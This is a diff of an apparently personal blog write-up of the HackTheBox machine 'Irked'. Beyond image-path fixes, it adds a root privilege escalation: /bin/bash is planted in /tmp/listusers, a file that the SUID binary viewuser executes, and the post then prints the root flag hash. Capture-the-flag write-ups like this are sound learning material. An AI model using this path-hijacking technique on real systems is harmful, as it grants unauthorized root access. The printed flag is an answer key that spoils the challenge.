@@ -4,7 +4,7 @@ title: Hackthebox Irked Writeup
 categories: HackTheBox
 ---
 
-<img src="/public/images/2019-04-20/irked_badge.png"><br>
+<img src="/public/images/2019-04-27/irked_badge.png"><br>
 ## Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
 This is a write-up of machine "Irked" on that website.
@@ -134,7 +134,7 @@ UPupDOWNdownLRlrBAbaSSss
 {% endhighlight %}
 
 On the top page of port 80, we can find a image file "irked.jpg"
-![placeholder](https://inar1.github.io/public/images/2019-04-20/2019-04-14-18-42-16.png)
+![placeholder](https://inar1.github.io/public/images/2019-04-27/2019-04-14-18-42-16.png)
 
 We can use <a href=''>this website</a> to decode the data of irked.jpg.<br>
 The data achieved is "Kab6h+m+bbp2J:HG".<br>
@@ -198,8 +198,21 @@ djmardov pts/0        2019-04-14 11:05 (10.10.14.23)
 sh: 1: /tmp/listusers: not found
 {% endhighlight %}
 
-Sounds like we need an input for "viewuser".<br>
-Try to let this binary read "root.txt".
+Sounds like we need an input for "viewuser" and shell tries to execute it.<br>
+Then put a command to "/tmp/listusers". We can confirm it is executed.
 {% highlight shell %}
+djmardov@irked:~$ echo /bin/bash > /tmp/listusers
+djmardov@irked:~$ chmod 777 /tmp/listusers
+djmardov@irked:~$ /usr/bin/viewuser 
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-04-23 17:05 (:0)
+djmardov pts/0        2019-04-27 15:35 (10.10.14.23)
+root@irked:~#
+{% endhighlight %}
 
+root.txt is in a directory "/root/".
+{% highlight shell %}
+root@irked:~# cat /root/root.txt
+8d8e9e8be64654b6dccc3bff4522daf3
 {% endhighlight %}
